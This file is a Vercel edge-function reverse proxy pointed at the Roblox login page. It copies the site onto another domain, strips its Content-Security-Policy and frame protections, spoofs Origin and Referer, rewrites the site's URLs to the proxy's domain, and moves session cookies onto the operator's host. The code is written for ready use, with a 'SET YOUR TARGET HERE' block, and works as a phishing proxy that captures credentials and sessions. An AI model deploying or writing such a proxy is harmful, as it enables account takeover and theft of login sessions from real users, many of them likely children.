/* ===== SET YOUR TARGET HERE ===== */
const TARGET = "https://roblox.com/login";
/* ================================ */

const OPTS = {
  rewriteBody:    true,   // swap target URLs -> your proxy URL inside html/css/js/json
  stripSecurity:  true,   // drop CSP / X-Frame-Options so pages render on your domain
  forwardCookies: true,   // pass cookies through (Domain= attribute stripped)
  cors:           true,  // permissive CORS headers — turn ON if you're proxying an API
  spoofOrigin:    true,   // send Origin/Referer as the target, not your domain
};

export const config = { runtime: "edge" };

const TARGET_URL = new URL(TARGET);
const BASE_PATH  = TARGET_URL.pathname.replace(/\/+$/, "");

const HOP_BY_HOP = new Set([
  "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
  "te", "trailer", "transfer-encoding", "upgrade",
]);

const TEXTY = /(text\/html|text\/css|text\/plain|javascript|application\/json|xml)/i;

export default async function handler(req) {
  const here = new URL(req.url);

  // real path comes from the rewrite in vercel.json; fall back to pathname
  let path = here.searchParams.get("__path") ?? here.pathname;
  here.searchParams.delete("__path");
  if (!path.startsWith("/")) path = "/" + path;

  const qs = here.searchParams.toString();
  const upstream = new URL(BASE_PATH + path + (qs ? "?" + qs : ""), TARGET_URL.origin);

  if (OPTS.cors && req.method === "OPTIONS") {
    return new Response(null, { status: 204, headers: corsHeaders(req) });
  }

  // ---- request headers ----
  const headers = new Headers();
  for (const [k, v] of req.headers) {
    const key = k.toLowerCase();
    if (HOP_BY_HOP.has(key)) continue;
    if (key === "host" || key === "accept-encoding" || key === "content-length") continue;
    if (key.startsWith("x-vercel-")) continue;
    if (key === "cookie" && !OPTS.forwardCookies) continue;
    headers.set(k, v);
  }
  headers.set("x-forwarded-host", here.host);
  headers.set("x-forwarded-proto", here.protocol.slice(0, -1));
  const ip = req.headers.get("x-forwarded-for") || req.headers.get("x-real-ip");
  if (ip) headers.set("x-forwarded-for", ip);

  if (OPTS.spoofOrigin) {
    if (headers.has("origin")) headers.set("origin", TARGET_URL.origin);
    if (headers.has("referer")) {
      headers.set("referer", headers.get("referer").split(here.origin).join(TARGET_URL.origin));
    }
  }

  const hasBody = !["GET", "HEAD"].includes(req.method);
  const body = hasBody ? await req.arrayBuffer() : undefined;

  let res;
  try {
    res = await fetch(upstream, { method: req.method, headers, body, redirect: "manual" });
  } catch (err) {
    return new Response(`Proxy error reaching ${upstream.origin}\n${err}`, {
      status: 502, headers: { "content-type": "text/plain" },
    });
  }

  // ---- response headers ----
  const out = new Headers();
  for (const [k, v] of res.headers) {
    const key = k.toLowerCase();
    if (HOP_BY_HOP.has(key)) continue;
    if (key === "content-encoding" || key === "content-length") continue;
    if (key === "set-cookie") continue;
    if (OPTS.stripSecurity && (
      key === "content-security-policy" ||
      key === "content-security-policy-report-only" ||
      key === "x-frame-options"
    )) continue;
    out.set(k, v);
  }

  // cookies: strip Domain= so the browser keeps them on YOUR host
  if (OPTS.forwardCookies) {
    const jar = typeof res.headers.getSetCookie === "function"
      ? res.headers.getSetCookie()
      : [res.headers.get("set-cookie")].filter(Boolean);
    for (const c of jar) out.append("set-cookie", c.replace(/;\s*domain=[^;]*/gi, ""));
  }

  // keep redirects on the proxy instead of bouncing to the real site
  const loc = res.headers.get("location");
  if (loc) {
    try {
      const abs = new URL(loc, upstream);
      if (abs.origin === TARGET_URL.origin) {
        let p = abs.pathname;
        if (BASE_PATH && p.startsWith(BASE_PATH)) p = p.slice(BASE_PATH.length) || "/";
        out.set("location", p + abs.search + abs.hash);
      }
    } catch {}
  }

  if (OPTS.cors) for (const [k, v] of corsHeaders(req)) out.set(k, v);

  if (res.status === 204 || res.status === 304 || req.method === "HEAD") {
    return new Response(null, { status: res.status, headers: out });
  }

  const ct = res.headers.get("content-type") || "";
  if (OPTS.rewriteBody && TEXTY.test(ct)) {
    const text = (await res.text())
      .split(TARGET_URL.origin).join(here.origin)
      .split(TARGET_URL.host).join(here.host);
    return new Response(text, { status: res.status, headers: out });
  }

  return new Response(res.body, { status: res.status, headers: out });
}

function corsHeaders(req) {
  return new Headers({
    "access-control-allow-origin":      req.headers.get("origin") || "*",
    "access-control-allow-credentials": "true",
    "access-control-allow-methods":     "GET,POST,PUT,PATCH,DELETE,HEAD,OPTIONS",
    "access-control-allow-headers":     req.headers.get("access-control-request-headers") || "*",
    "access-control-expose-headers":    "*",
    "access-control-max-age":           "86400",
  });
}
